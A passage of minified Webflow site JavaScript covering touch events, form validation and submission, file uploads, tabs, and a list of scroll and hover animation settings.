            t.addEventListener("mousemove", u, !1),
            t.addEventListener("mouseup", d, !1),
            t.addEventListener("mouseout", f, !1),
            (this.destroy = function () {
              t.removeEventListener("touchstart", s, !1),
                t.removeEventListener("touchmove", u, !1),
                t.removeEventListener("touchend", d, !1),
                t.removeEventListener("touchcancel", f, !1),
                t.removeEventListener("mousedown", s, !1),
                t.removeEventListener("mousemove", u, !1),
                t.removeEventListener("mouseup", d, !1),
                t.removeEventListener("mouseout", f, !1),
                (t = null);
            });
        }
        return (
          (e.event.special.tap = { bindType: "click", delegateType: "click" }),
          (t.init = function (t) {
            return (t = "string" == typeof t ? e(t).get(0) : t)
              ? new i(t)
              : null;
          }),
          (t.instance = t.init(document)),
          t
        );
      })
    );
  },
  function (e, t, n) {
    "use strict";
    var i = n(1)(n(336)),
      a = n(4);
    a.define(
      "forms",
      (e.exports = function (e, t) {
        var n,
          r,
          o,
          c,
          s,
          u = {},
          d = e(document),
          f = window.location,
          l = window.XDomainRequest && !window.atob,
          p = ".w-form",
          E = /e(-)?mail/i,
          v = /^\S+@\S+$/,
          I = window.alert,
          g = a.env(),
          y = /list-manage[1-9]?.com/i,
          T = t.debounce(function () {
            I(
              "Oops! This page has improperly configured forms. Please contact your website administrator to fix this issue."
            );
          }, 100);
        function h(t, n) {
          var i = e(n),
            a = e.data(n, p);
          a || (a = e.data(n, p, { form: i })), _(a);
          var o = i.closest("div.w-form");
          (a.done = o.find("> .w-form-done")),
            (a.fail = o.find("> .w-form-fail")),
            (a.fileUploads = o.find(".w-file-upload")),
            a.fileUploads.each(function (t) {
              !(function (t, n) {
                if (n.fileUploads && n.fileUploads[t]) {
                  var i,
                    a = e(n.fileUploads[t]),
                    r = a.find("> .w-file-upload-default"),
                    o = a.find("> .w-file-upload-uploading"),
                    c = a.find("> .w-file-upload-success"),
                    u = a.find("> .w-file-upload-error"),
                    d = r.find(".w-file-upload-input"),
                    f = r.find(".w-file-upload-label"),
                    l = f.children(),
                    p = u.find(".w-file-upload-error-msg"),
                    E = c.find(".w-file-upload-file"),
                    v = c.find(".w-file-remove-link"),
                    I = E.find(".w-file-upload-file-name"),
                    y = p.attr("data-w-size-error"),
                    T = p.attr("data-w-type-error"),
                    h = p.attr("data-w-generic-error");
                  if (
                    (g ||
                      f.on("click keydown", function (e) {
                        ("keydown" === e.type &&
                          13 !== e.which &&
                          32 !== e.which) ||
                          (e.preventDefault(), d.click());
                      }),
                    f
                      .find(".w-icon-file-upload-icon")
                      .attr("aria-hidden", "true"),
                    v
                      .find(".w-icon-file-upload-remove")
                      .attr("aria-hidden", "true"),
                    g)
                  )
                    d.on("click", function (e) {
                      e.preventDefault();
                    }),
                      f.on("click", function (e) {
                        e.preventDefault();
                      }),
                      l.on("click", function (e) {
                        e.preventDefault();
                      });
                  else {
                    v.on("click keydown", function (e) {
                      if ("keydown" === e.type) {
                        if (13 !== e.which && 32 !== e.which) return;
                        e.preventDefault();
                      }
                      d.removeAttr("data-value"),
                        d.val(""),
                        I.html(""),
                        r.toggle(!0),
                        c.toggle(!1),
                        f.focus();
                    }),
                      d.on("change", function (a) {
                        (i = a.target && a.target.files && a.target.files[0]) &&
                          (r.toggle(!1),
                          u.toggle(!1),
                          o.toggle(!0),
                          o.focus(),
                          I.text(i.name),
                          A() || m(n),
                          (n.fileUploads[t].uploading = !0),
                          (function (t, n) {
                            var i = new URLSearchParams({
                              name: t.name,
                              size: t.size,
                            });
                            e.ajax({
                              type: "GET",
                              url: "".concat(s, "?").concat(i),
                              crossDomain: !0,
                            })
                              .done(function (e) {
                                n(null, e);
                              })
                              .fail(function (e) {
                                n(e);
                              });
                          })(i, S));
                      });
                    var b = f.outerHeight();
                    d.height(b), d.width(1);
                  }
                }
                function O(e) {
                  var i = e.responseJSON && e.responseJSON.msg,
                    a = h;
                  "string" == typeof i &&
                  0 === i.indexOf("InvalidFileTypeError")
                    ? (a = T)
                    : "string" == typeof i &&
                      0 === i.indexOf("MaxFileSizeError") &&
                      (a = y),
                    p.text(a),
                    d.removeAttr("data-value"),
                    d.val(""),
                    o.toggle(!1),
                    r.toggle(!0),
                    u.toggle(!0),
                    u.focus(),
                    (n.fileUploads[t].uploading = !1),
                    A() || _(n);
                }
                function S(t, n) {
                  if (t) return O(t);
                  var a = n.fileName,
                    r = n.postData,
                    o = n.fileId,
                    c = n.s3Url;
                  d.attr("data-value", o),
                    (function (t, n, i, a, r) {
                      var o = new FormData();
                      for (var c in n) o.append(c, n[c]);
                      o.append("file", i, a),
                        e
                          .ajax({
                            type: "POST",
                            url: t,
                            data: o,
                            processData: !1,
                            contentType: !1,
                          })
                          .done(function () {
                            r(null);
                          })
                          .fail(function (e) {
                            r(e);
                          });
                    })(c, r, i, a, L);
                }
                function L(e) {
                  if (e) return O(e);
                  o.toggle(!1),
                    c.css("display", "inline-block"),
                    c.focus(),
                    (n.fileUploads[t].uploading = !1),
                    A() || _(n);
                }
                function A() {
                  return (
                    (n.fileUploads && n.fileUploads.toArray()) ||
                    []
                  ).some(function (e) {
                    return e.uploading;
                  });
                }
              })(t, a);
            });
          var c =
            a.form.attr("aria-label") || a.form.attr("data-name") || "Form";
          a.done.attr("aria-label") || a.form.attr("aria-label", c),
            a.done.attr("tabindex", "-1"),
            a.done.attr("role", "region"),
            a.done.attr("aria-label") ||
              a.done.attr("aria-label", c + " success"),
            a.fail.attr("tabindex", "-1"),
            a.fail.attr("role", "region"),
            a.fail.attr("aria-label") ||
              a.fail.attr("aria-label", c + " failure");
          var u = (a.action = i.attr("action"));
          (a.handler = null),
            (a.redirect = i.attr("data-redirect")),
            y.test(u) ? (a.handler = L) : u || (r ? (a.handler = S) : T());
        }
        function _(e) {
          var t = (e.btn = e.form.find(':input[type="submit"]'));
          (e.wait = e.btn.attr("data-wait") || null),
            (e.success = !1),
            t.prop("disabled", !1),
            e.label && t.val(e.label);
        }
        function m(e) {
          var t = e.btn,
            n = e.wait;
          t.prop("disabled", !0), n && ((e.label = t.val()), t.val(n));
        }
        function b(t, n) {
          var i = null;
          return (
            (n = n || {}),
            t
              .find(':input:not([type="submit"]):not([type="file"])')
              .each(function (a, r) {
                var o = e(r),
                  c = o.attr("type"),
                  s =
                    o.attr("data-name") || o.attr("name") || "Field " + (a + 1),
                  u = o.val();
                if ("checkbox" === c) u = o.is(":checked");
                else if ("radio" === c) {
                  if (null === n[s] || "string" == typeof n[s]) return;
                  u =
                    t
                      .find('input[name="' + o.attr("name") + '"]:checked')
                      .val() || null;
                }
                "string" == typeof u && (u = e.trim(u)),
                  (n[s] = u),
                  (i =
                    i ||
                    (function (e, t, n, i) {
                      var a = null;
                      return (
                        "password" === t
                          ? (a = "Passwords cannot be submitted.")
                          : e.attr("required")
                          ? i
                            ? E.test(e.attr("type")) &&
                              (v.test(i) ||
                                (a =
                                  "Please enter a valid email address for: " +
                                  n))
                            : (a = "Please fill out the required field: " + n)
                          : "g-recaptcha-response" !== n ||
                            i ||
                            (a = "Please confirm you’re not a robot."),
                        a
                      );
                    })(o, c, s, u));
              }),
            i
          );
        }
        u.ready =
          u.design =
          u.preview =
            function () {
              (r = e("html").attr("data-wf-site")),
                (c = "https://webflow.com/api/v1/form/" + r),
                l &&
                  c.indexOf("https://webflow.com") >= 0 &&
                  (c = c.replace(
                    "https://webflow.com",
                    "http://formdata.webflow.com"
                  )),
                (s = "".concat(c, "/signFile")),
                (n = e(p + " form")).length && n.each(h),
                g ||
                  o ||
                  (function () {
                    (o = !0),
                      d.on("submit", p + " form", function (t) {
                        var n = e.data(this, p);
                        n.handler && ((n.evt = t), n.handler(n));
                      });
                    d.on(
                      "change",
                      p + ' form input[type="checkbox"]:not(.w-checkbox-input)',
                      function (t) {
                        e(t.target)
                          .siblings(".w-checkbox-input")
                          .toggleClass("w--redirected-checked");
                      }
                    ),
                      d.on(
                        "change",
                        p + ' form input[type="radio"]',
                        function (t) {
                          e(
                            'input[name="'
                              .concat(t.target.name, '"]:not(')
                              .concat(".w-checkbox-input", ")")
                          ).map(function (t, n) {
                            return e(n)
                              .siblings(".w-radio-input")
                              .removeClass("w--redirected-checked");
                          });
                          var n = e(t.target);
                          n.hasClass("w-radio-input") ||
                            n
                              .siblings(".w-radio-input")
                              .addClass("w--redirected-checked");
                        }
                      ),
                      [
                        ["checkbox", ".w-checkbox-input"],
                        ["radio", ".w-radio-input"],
                      ].forEach(function (t) {
                        var n = (0, i.default)(t, 2),
                          a = n[0],
                          r = n[1];
                        d.on(
                          "focus",
                          p +
                            ' form input[type="'.concat(a, '"]:not(') +
                            r +
                            ")",
                          function (t) {
                            e(t.target)
                              .siblings(r)
                              .addClass("w--redirected-focus"),
                              e(t.target)
                                .filter(
                                  ":focus-visible, [data-wf-focus-visible]"
                                )
                                .siblings(r)
                                .addClass("w--redirected-focus-visible");
                          }
                        ),
                          d.on(
                            "blur",
                            p +
                              ' form input[type="'.concat(a, '"]:not(') +
                              r +
                              ")",
                            function (t) {
                              e(t.target)
                                .siblings(r)
                                .removeClass(
                                  ""
                                    .concat("w--redirected-focus", " ")
                                    .concat("w--redirected-focus-visible")
                                );
                            }
                          );
                      });
                  })();
            };
        var O = { _mkto_trk: "marketo" };
        function S(t) {
          _(t);
          var n = t.form,
            i = {
              name: n.attr("data-name") || n.attr("name") || "Untitled Form",
              source: f.href,
              test: a.env(),
              fields: {},
              fileUploads: {},
              dolphin: /pass[\s-_]?(word|code)|secret|login|credentials/i.test(
                n.html()
              ),
              trackingCookies: document.cookie
                .split("; ")
                .reduce(function (e, t) {
                  var n = t.split("="),
                    i = n[0];
                  if (i in O) {
                    var a = O[i],
                      r = n.slice(1).join("=");
                    e[a] = r;
                  }
                  return e;
                }, {}),
            },
            o = n.attr("data-wf-flow");
          o && (i.wfFlow = o), w(t);
          var s = b(n, i.fields);
          if (s) return I(s);
          (i.fileUploads = (function (t) {
            var n = {};
            return (
              t.find(':input[type="file"]').each(function (t, i) {
                var a = e(i),
                  r =
                    a.attr("data-name") || a.attr("name") || "File " + (t + 1),
                  o = a.attr("data-value");
                "string" == typeof o && (o = e.trim(o)), (n[r] = o);
              }),
              n
            );
          })(n)),
            m(t),
            r
              ? e
                  .ajax({
                    url: c,
                    type: "POST",
                    data: i,
                    dataType: "json",
                    crossDomain: !0,
                  })
                  .done(function (e) {
                    e && 200 === e.code && (t.success = !0), A(t);
                  })
                  .fail(function () {
                    A(t);
                  })
              : A(t);
        }
        function L(n) {
          _(n);
          var i = n.form,
            a = {};
          if (!/^https/.test(f.href) || /^https/.test(n.action)) {
            w(n);
            var r,
              o = b(i, a);
            if (o) return I(o);
            m(n),
              t.each(a, function (e, t) {
                E.test(t) && (a.EMAIL = e),
                  /^((full[ _-]?)?name)$/i.test(t) && (r = e),
                  /^(first[ _-]?name)$/i.test(t) && (a.FNAME = e),
                  /^(last[ _-]?name)$/i.test(t) && (a.LNAME = e);
              }),
              r &&
                !a.FNAME &&
                ((r = r.split(" ")),
                (a.FNAME = r[0]),
                (a.LNAME = a.LNAME || r[1]));
            var c = n.action.replace("/post?", "/post-json?") + "&c=?",
              s = c.indexOf("u=") + 2;
            s = c.substring(s, c.indexOf("&", s));
            var u = c.indexOf("id=") + 3;
            (u = c.substring(u, c.indexOf("&", u))),
              (a["b_" + s + "_" + u] = ""),
              e
                .ajax({ url: c, data: a, dataType: "jsonp" })
                .done(function (e) {
                  (n.success = "success" === e.result || /already/.test(e.msg)),
                    n.success || console.info("MailChimp error: " + e.msg),
                    A(n);
                })
                .fail(function () {
                  A(n);
                });
          } else i.attr("method", "post");
        }
        function A(e) {
          var t = e.form,
            n = e.redirect,
            i = e.success;
          i && n
            ? a.location(n)
            : (e.done.toggle(i),
              e.fail.toggle(!i),
              i ? e.done.focus() : e.fail.focus(),
              t.toggle(!i),
              _(e));
        }
        function w(e) {
          e.evt && e.evt.preventDefault(), (e.evt = null);
        }
        return u;
      })
    );
  },
  function (e, t, n) {
    var i = n(337),
      a = n(338),
      r = n(339);
    e.exports = function (e, t) {
      return i(e) || a(e, t) || r();
    };
  },
  function (e, t) {
    e.exports = function (e) {
      if (Array.isArray(e)) return e;
    };
  },
  function (e, t) {
    e.exports = function (e, t) {
      var n = [],
        i = !0,
        a = !1,
        r = void 0;
      try {
        for (
          var o, c = e[Symbol.iterator]();
          !(i = (o = c.next()).done) && (n.push(o.value), !t || n.length !== t);
          i = !0
        );
      } catch (e) {
        (a = !0), (r = e);
      } finally {
        try {
          i || null == c.return || c.return();
        } finally {
          if (a) throw r;
        }
      }
      return n;
    };
  },
  function (e, t) {
    e.exports = function () {
      throw new TypeError(
        "Invalid attempt to destructure non-iterable instance"
      );
    };
  },
  function (e, t, n) {
    "use strict";
    var i = n(4),
      a = n(69);
    i.define(
      "tabs",
      (e.exports = function (e) {
        var t,
          n,
          r = {},
          o = e.tram,
          c = e(document),
          s = i.env,
          u = s.safari,
          d = s(),
          f = "data-w-tab",
          l = "data-w-pane",
          p = ".w-tabs",
          E = "w--current",
          v = "w--tab-active",
          I = a.triggers,
          g = !1;
        function y() {
          (n = d && i.env("design")),
            (t = c.find(p)).length &&
              (t.each(_),
              i.env("preview") && !g && t.each(h),
              T(),
              i.redraw.on(r.redraw));
        }
        function T() {
          i.redraw.off(r.redraw);
        }
        function h(t, n) {
          var i = e.data(n, p);
          i &&
            (i.links && i.links.each(I.reset),
            i.panes && i.panes.each(I.reset));
        }
        function _(t, i) {
          var a = p.substr(1) + "-" + t,
            r = e(i),
            o = e.data(i, p);
          if (
            (o || (o = e.data(i, p, { el: r, config: {} })),
            (o.current = null),
            (o.tabIdentifier = a + "-" + f),
            (o.paneIdentifier = a + "-" + l),
            (o.menu = r.children(".w-tab-menu")),
            (o.links = o.menu.children(".w-tab-link")),
            (o.content = r.children(".w-tab-content")),
            (o.panes = o.content.children(".w-tab-pane")),
            o.el.off(p),
            o.links.off(p),
            o.menu.attr("role", "tablist"),
            o.links.attr("tabindex", "-1"),
            (function (e) {
              var t = {};
              t.easing = e.el.attr("data-easing") || "ease";
              var n = parseInt(e.el.attr("data-duration-in"), 10);
              n = t.intro = n == n ? n : 0;
              var i = parseInt(e.el.attr("data-duration-out"), 10);
              (i = t.outro = i == i ? i : 0),
                (t.immediate = !n && !i),
                (e.config = t);
            })(o),
            !n)
          ) {
            o.links.on(
              "click" + p,
              (function (e) {
                return function (t) {
                  t.preventDefault();
                  var n = t.currentTarget.getAttribute(f);
                  n && m(e, { tab: n });
                };
              })(o)
            ),
              o.links.on(
                "keydown" + p,
                (function (e) {
                  return function (t) {
                    var n = (function (e) {
                        var t = e.current;
                        return Array.prototype.findIndex.call(
                          e.links,
                          function (e) {
                            return e.getAttribute(f) === t;
                          },
                          null
                        );
                      })(e),
                      i = t.key,
                      a = {
                        ArrowLeft: n - 1,
                        ArrowUp: n - 1,
                        ArrowRight: n + 1,
                        ArrowDown: n + 1,
                        End: e.links.length - 1,
                        Home: 0,
                      };
                    if (i in a) {
                      t.preventDefault();
                      var r = a[i];
                      -1 === r && (r = e.links.length - 1),
                        r === e.links.length && (r = 0);
                      var o = e.links[r].getAttribute(f);
                      o && m(e, { tab: o });
                    }
                  };
                })(o)
              );
            var c = o.links.filter("." + E).attr(f);
            c && m(o, { tab: c, immediate: !0 });
          }
        }
        function m(t, n) {
          n = n || {};
          var a = t.config,
            r = a.easing,
            c = n.tab;
          if (c !== t.current) {
            var s;
            (t.current = c),
              t.links.each(function (i, r) {
                var o = e(r);
                if (n.immediate || a.immediate) {
                  var u = t.panes[i];
                  r.id || (r.id = t.tabIdentifier + "-" + i),
                    u.id || (u.id = t.paneIdentifier + "-" + i),
                    (r.href = "#" + u.id),
                    r.setAttribute("role", "tab"),
                    r.setAttribute("aria-controls", u.id),
                    r.setAttribute("aria-selected", "false"),
                    u.setAttribute("role", "tabpanel"),
                    u.setAttribute("aria-labelledby", r.id);
                }
                r.getAttribute(f) === c
                  ? ((s = r),
                    o
                      .addClass(E)
                      .removeAttr("tabindex")
                      .attr({ "aria-selected": "true" })
                      .each(I.intro))
                  : o.hasClass(E) &&
                    o
                      .removeClass(E)
                      .attr({ tabindex: "-1", "aria-selected": "false" })
                      .each(I.outro);
              });
            var d = [],
              l = [];
            t.panes.each(function (t, n) {
              var i = e(n);
              n.getAttribute(f) === c ? d.push(n) : i.hasClass(v) && l.push(n);
            });
            var p = e(d),
              y = e(l);
            if (n.immediate || a.immediate)
              return (
                p.addClass(v).each(I.intro),
                y.removeClass(v),
                void (g || i.redraw.up())
              );
            var T = window.scrollX,
              h = window.scrollY;
            s.focus(),
              window.scrollTo(T, h),
              y.length && a.outro
                ? (y.each(I.outro),
                  o(y)
                    .add("opacity " + a.outro + "ms " + r, { fallback: u })
                    .start({ opacity: 0 })
                    .then(function () {
                      return b(a, y, p);
                    }))
                : b(a, y, p);
          }
        }
        function b(e, t, n) {
          if (
            (t
              .removeClass(v)
              .css({
                opacity: "",
                transition: "",
                transform: "",
                width: "",
                height: "",
              }),
            n.addClass(v).each(I.intro),
            i.redraw.up(),
            !e.intro)
          )
            return o(n).set({ opacity: 1 });
          o(n)
            .set({ opacity: 0 })
            .redraw()
            .add("opacity " + e.intro + "ms " + e.easing, { fallback: u })
            .start({ opacity: 1 });
        }
        return (
          (r.ready = r.design = r.preview = y),
          (r.redraw = function () {
            (g = !0), y(), (g = !1);
          }),
          (r.destroy = function () {
            (t = c.find(p)).length && (t.each(h), T());
          }),
          r
        );
      })
    );
  },
]),
  Webflow.require("ix2").init({
    events: {
      e: {
        id: "e",
        name: "",
        animationType: "custom",
        eventTypeId: "PAGE_START",
        action: {
          id: "",
          actionTypeId: "GENERAL_START_ACTION",
          config: {
            delay: 0,
            easing: "",
            duration: 0,
            actionListId: "a",
            affectedElements: {},
            playInReverse: !1,
            autoStopEventId: "e-2",
          },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d",
          appliesTo: "PAGE",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d",
            appliesTo: "PAGE",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: null,
          scrollOffsetUnit: null,
          delay: null,
          direction: null,
          effectIn: null,
        },
        createdOn: 1635844350933,
      },
      "e-3": {
        id: "e-3",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-4" },
        },
        mediaQueries: ["main", "medium", "small", "tiny"],
        target: {
          id: "6180f175feada501f31bcc4d|c4d97587-8a11-7109-1f9f-249970c065db",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|c4d97587-8a11-7109-1f9f-249970c065db",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 0,
          scrollOffsetUnit: "%",
          delay: 0,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1635847307631,
      },
      "e-5": {
        id: "e-5",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-6" },
        },
        mediaQueries: ["main", "medium", "small", "tiny"],
        target: {
          id: "6180f175feada501f31bcc4d|fcfcd8d4-5add-2b5b-a10c-cc2123e06f12",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|fcfcd8d4-5add-2b5b-a10c-cc2123e06f12",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 20,
          scrollOffsetUnit: "%",
          delay: 0,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1635847379411,
      },
      "e-7": {
        id: "e-7",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-8" },
        },
        mediaQueries: ["main", "medium", "small", "tiny"],
        target: {
          id: "6180f175feada501f31bcc4d|9f7a11c8-4047-08ca-360a-c0c2c0fe493a",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|9f7a11c8-4047-08ca-360a-c0c2c0fe493a",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 20,
          scrollOffsetUnit: "%",
          delay: 0,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1635847401721,
      },
      "e-11": {
        id: "e-11",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-12" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|cbdd8f3b-668b-f174-c655-8426d700a20a",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|cbdd8f3b-668b-f174-c655-8426d700a20a",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 200,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1635847573141,
      },
      "e-13": {
        id: "e-13",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-14" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|79625f9e-1c6f-20fd-f865-25acb8e69241",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|79625f9e-1c6f-20fd-f865-25acb8e69241",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 100,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1635847642265,
      },
      "e-15": {
        id: "e-15",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-16" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|8aaa7a8e-26f8-833a-ef80-7e118cc40b54",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|8aaa7a8e-26f8-833a-ef80-7e118cc40b54",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 300,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1635847671159,
      },
      "e-17": {
        id: "e-17",
        name: "",
        animationType: "preset",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "SLIDE_EFFECT",
          instant: !1,
          config: { actionListId: "slideInBottom", autoStopEventId: "e-18" },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|1bbc2e85-31b6-ee38-8892-8ad4e826b665",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|1bbc2e85-31b6-ee38-8892-8ad4e826b665",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 30,
          scrollOffsetUnit: "%",
          delay: 400,
          direction: "BOTTOM",
          effectIn: !0,
        },
        createdOn: 1635847694309,
      },
      "e-19": {
        id: "e-19",
        name: "",
        animationType: "custom",
        eventTypeId: "SCROLL_INTO_VIEW",
        action: {
          id: "",
          actionTypeId: "GENERAL_START_ACTION",
          config: {
            delay: 0,
            easing: "",
            duration: 0,
            actionListId: "a-2",
            affectedElements: {},
            playInReverse: !1,
            autoStopEventId: "e-20",
          },
        },
        mediaQueries: ["main", "medium", "small", "tiny"],
        target: {
          id: "6180f175feada501f31bcc4d|fcfcd8d4-5add-2b5b-a10c-cc2123e06f11",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|fcfcd8d4-5add-2b5b-a10c-cc2123e06f11",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: 60,
          scrollOffsetUnit: "%",
          delay: null,
          direction: null,
          effectIn: null,
        },
        createdOn: 1635848381770,
      },
      "e-21": {
        id: "e-21",
        name: "",
        animationType: "custom",
        eventTypeId: "SCROLLING_IN_VIEW",
        action: {
          id: "",
          actionTypeId: "GENERAL_CONTINUOUS_ACTION",
          config: { actionListId: "a-3", affectedElements: {}, duration: 0 },
        },
        mediaQueries: ["main"],
        target: {
          selector: ".main",
          originalId:
            "6180f175feada501f31bcc4d|cf369d5c-2cd2-6560-8692-c3a20be0c2d0",
          appliesTo: "CLASS",
        },
        targets: [
          {
            selector: ".main",
            originalId:
              "6180f175feada501f31bcc4d|cf369d5c-2cd2-6560-8692-c3a20be0c2d0",
            appliesTo: "CLASS",
          },
        ],
        config: [
          {
            continuousParameterGroupId: "a-3-p",
            smoothing: 90,
            startsEntering: !0,
            addStartOffset: !1,
            addOffsetValue: 50,
            startsExiting: !1,
            addEndOffset: !1,
            endOffsetValue: 50,
          },
        ],
        createdOn: 1635878337715,
      },











      "e-04": {
        id: "e-04",
        name: "",
        animationType: "custom",
        eventTypeId: "MOUSE_OVER",
        action: {
          id: "",
          actionTypeId: "GENERAL_START_ACTION",
          config: {
            delay: 0,
            easing: "",
            duration: 0,
            actionListId: "a-4",
            affectedElements: {},
            playInReverse: !1,
            autoStopEventId: "e-24",
          },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|0b84718e-c201-e886-a3e6-fbde4d3f396244",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|0b84718e-c201-e886-a3e6-fbde4d3f396244",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: null,
          scrollOffsetUnit: null,
          delay: null,
          direction: null,
          effectIn: null,
        },
        createdOn: 1635973198070,
      },




















      "e-24": {
        id: "e-24",
        name: "",
        animationType: "custom",
        eventTypeId: "MOUSE_OVER",
        action: {
          id: "",
          actionTypeId: "GENERAL_START_ACTION",
          config: {
            delay: 0,
            easing: "",
            duration: 0,
            actionListId: "a-9",
            affectedElements: {},
            playInReverse: !1,
            autoStopEventId: "e-25",
          },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|0b84718e-c201-e886-a3e6-fbde4d3f3962",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|0b84718e-c201-e886-a3e6-fbde4d3f3962",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: null,
          scrollOffsetUnit: null,
          delay: null,
          direction: null,
          effectIn: null,
        },
        createdOn: 1635973198070,
      },
      "e-26": {
        id: "e-26",
        name: "",
        animationType: "custom",
        eventTypeId: "MOUSE_OVER",
        action: {
          id: "",
          actionTypeId: "GENERAL_START_ACTION",
          config: {
            delay: 0,
            easing: "",
            duration: 0,
            actionListId: "a-8",
            affectedElements: {},
            playInReverse: !1,
            autoStopEventId: "e-27",
          },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|0b84718e-c201-e886-a3e6-fbde4d3f3953",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|0b84718e-c201-e886-a3e6-fbde4d3f3953",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: null,
          scrollOffsetUnit: null,
          delay: null,
          direction: null,
          effectIn: null,
        },
        createdOn: 1635973210131,
      },
      "e-29": {
        id: "e-29",
        name: "",
        animationType: "custom",
        eventTypeId: "MOUSE_OUT",
        action: {
          id: "",
          actionTypeId: "GENERAL_START_ACTION",
          config: {
            delay: 0,
            easing: "",
            duration: 0,
            actionListId: "a-10",
            affectedElements: {},
            playInReverse: !1,
            autoStopEventId: "e-28",
          },
        },
        mediaQueries: ["main"],
        target: {
          id: "6180f175feada501f31bcc4d|0b84718e-c201-e886-a3e6-fbde4d3f3943",
          appliesTo: "ELEMENT",
          styleBlockIds: [],
        },
        targets: [
          {
            id: "6180f175feada501f31bcc4d|0b84718e-c201-e886-a3e6-fbde4d3f3943",
            appliesTo: "ELEMENT",
            styleBlockIds: [],
          },
        ],
        config: {
          loop: !1,
          playInReverse: !1,
          scrollOffsetValue: null,
          scrollOffsetUnit: null,
          delay: null,
          direction: null,
          effectIn: null,
        },
        createdOn: 1635973242085,
      },
      "e-30": {
